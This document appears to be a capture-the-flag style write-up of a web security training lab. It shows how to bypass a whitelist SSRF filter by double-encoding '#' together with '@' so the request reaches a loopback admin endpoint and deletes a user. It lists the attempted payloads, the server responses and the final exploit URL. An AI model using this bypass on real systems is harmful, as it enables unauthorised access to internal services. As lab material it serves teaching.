### Lab: SSRF with whitelist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

_____

Analysis and Exploit:

1. "Stock Check" feature can be found at **/product?productId=[ID]**
    - POST **/product/stock**
    - stockApi = http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1 (http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)

2. Attempts **[BURP-REPEATER]**:
    - stockApi=http://localhost == "External stock check host must be stock.weliketoshop.net"
    - stockApi=http://stock.weliketoshop.net == 500 Internal Server Error / "Could not connect to external stock check service"
    - http://stock.weliketoshop.net:8080 == 400 Bad Request / "Missing parameter"
    - http%253a//stock.weliketoshop.net%253a8080 (url-encode x2) / 400 / "External stock check host must be stock.weliketoshop.net"
    - http%3a//stock.weliketoshop.net%3a8080 (url-encode x1) / 400 / "Missing parameter
    - http%3a//stock.weliketoshop.net+ / 400 / "Invalid external stock check url 'Illegal character in authority at index 7: http://stock.weliketoshop.net '"
    - http%3a//stock.weliketoshop.net%40 (@) / 400 / "External stock check host must be stock.weliketoshop.net"
    - http%3a//stock.weliketoshop.net%23 (#) / 500 / "Could not connect to external stock check service" 
    - http://localhost#@stock.weliketoshop.net / 400 / "External stock check host must be stock.weliketoshop.net"
    - http:// localhost%23@stock.weliketoshop.net / 400 / "External stock check host must be stock.weliketoshop.net"
    - http:// localhost%2523@stock.weliketoshop.net / 200
3. Delete user _carlos_ **[BURP-REPEATER]**
    - http:// localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
        - HTTP/2 302 Found
            - HTTP/2 401 Unauthorized "Admin interface only available if logged in as an administrator, or if requested from loopback"

**NOTE**: URL parsers do not work in the same way. In this lab, the parser reads **http://** and what comes next is considered to be the site to reach.
Using the feature # and @, supported by HTTP and URL, we can 'break' the parsing process (combined with encoding or double enconding of special caharacters).  
The # symbol is read by the parser as a sort of shortcut to reach a specific 'id' in the HTML, while the @ symbol is used to embed credentials in the URL.  
Since the parser decodes only 1 time the URL, the double encoded symbol # breaks the parsing process, the needed site 'stock.weliketoshop.net' is still present but ignored.  
Everything passed after a new / is considered to be a page to reach at the given site, localhost in this case.  

_____

Script:

1. Delete user | POST **/product/stock** | params: stockApi
    - stockApi: http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos
        - Symbol # encoded once because the urllib encoded it one more time by default